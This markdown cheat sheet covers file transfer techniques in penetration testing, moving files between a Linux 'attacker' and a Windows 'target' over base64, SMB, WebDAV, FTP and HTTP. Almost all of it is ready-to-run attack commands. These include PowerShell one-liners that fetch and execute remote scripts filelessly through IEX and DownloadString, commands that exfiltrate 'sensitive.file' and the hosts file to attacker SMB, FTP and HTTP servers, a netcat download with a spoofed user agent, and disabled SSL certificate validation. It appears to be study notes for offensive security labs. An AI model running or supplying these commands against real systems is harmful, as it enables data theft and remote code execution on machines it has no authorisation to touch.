> TODO: add more from [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
## Base64

`fish`, `zsh`,  `bash` oneliner string comparison (for hash comparison)

```sh
[ '0733351879b2fa9bd05c7ca3061529c0' == '0733351879b2fa9bd05c7ca3061529c0' ] && echo true || echo false
```

> The space after `[` is very important. Yes, `[` is a binary in `/usr/bin/[`

One liner for uppercase all letter

```sh
echo '0733351879b2fa9bd05c7ca3061529c0' | tr '[:lower:]' '[:upper:]'
```

### Download

Convert file on linux attacker to `base64` text

```sh
base64 -w 0 ./file
## Get MD5 hash to compare integrity
md5sum ./file
```

Convert `base64` text to file on Windows target

```powershell
[System.IO.File]::WriteAllBytes(".\output.file", [System.Convert]::FromBase64String("aGVsbG8="))
## Get MD5 hash to compare integrity
Get-FileHash .\output.file -Algorithm md5
```

### Upload

Convert file on Windows target to `base64` text

```powershell
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\fullpath\input.file"))
certutil -encode .\input.file b64.txt
## Get MD5 hash to compare integrity
Get-FileHash .\input.file -Algorithm md5
type b64.txt
## copy the text
del b64.txt
```

Convert `base64` text to file on Linux attacker

```sh
echo 'aGVsbG8=' | base64 -d > ./file
## Get MD5 hash to compare integrity
md5sum ./file
```

## SMB

Open an `smb` server on linux attacker

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

### Mount

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
net use n: \\<attacker-ip>\share /user:test test
```

### Download

```powershell
copy \\<attacker-ip>\share\<file>
```

### Upload

```powershell
copy .\sensitive.file \\<attacker-ip>\share\
```

## WebDav

Installation on Linux attacker

```sh
sudo apt install python3-wsgidav python3-cheroot
```

Open a webdav listener, port 80

```sh
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

### Download

```powershell
copy \\<attacker-ip>\DavWWWRoot\<file>
copy \\<attacker-ip>\sharefolder\<file>
```

### Upload

```powershell
copy .\sensitive.file \\<attacker-ip>\DavWWWRoot\
copy .\sensitive.file \\<attacker-ip>\sharefolder\
```

> Commands used the same as SMB. On windows at least. WebDav is a http module that makes http server behave like a file share server.

## FTP

### Download

Open an `ftp` server on linux attacker

```sh
sudo python3 -m pyftpdlib --port 21
```

Download file from `ftp` server on Windows target

```powershell
(New-Object Net.WebClient).DownloadString('ftp://<attacker-ip>/<file>')
```

Or, if can't execute above and don't have interactive shell

```powershell
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Upload

Open a writable `ftp` server on linux attacker

```sh
sudo python3 -m pyftpdlib --port 21 --write
```

Upload file to `ftp` server on Windows target

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Or, if can't execute above and don't have interactive shell

```powershell
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## HTTP server

### Download

Open an `http` server on linux attacker

```sh
python -m http.server -p 8080
```

Download file from `http` server on Windows target

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
## Not blocking execution
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

Or, if invalid ssl cert

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

Or, filelessly, download ps script and executes

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
Invoke-WebRequest -UseBasicParsing https://<ip>/file.ps1 | IEX
```

Or, change user agent. First list out what user agent we have

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Then use one of them

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### Upload

Install and run `http` upload server on Linux attacker

```sh
pipx install uploadserver
python3 -m uploadserver
```

Install PSUpload on Windows target

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Upload file to `http` server

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

#### Or, using native windows tools. A little cranky

On Linux attacker, open `netcat` listener. 

```sh
nc -lvnp 8080
```

> Note that when Windows target connects, it will send a http request, so you have to remove the http header and get only the base64 string

Convert file to base64 string on windows

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '.\file' -Encoding Byte))
```

Upload

```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8080/ -Method POST -Body $b64
```
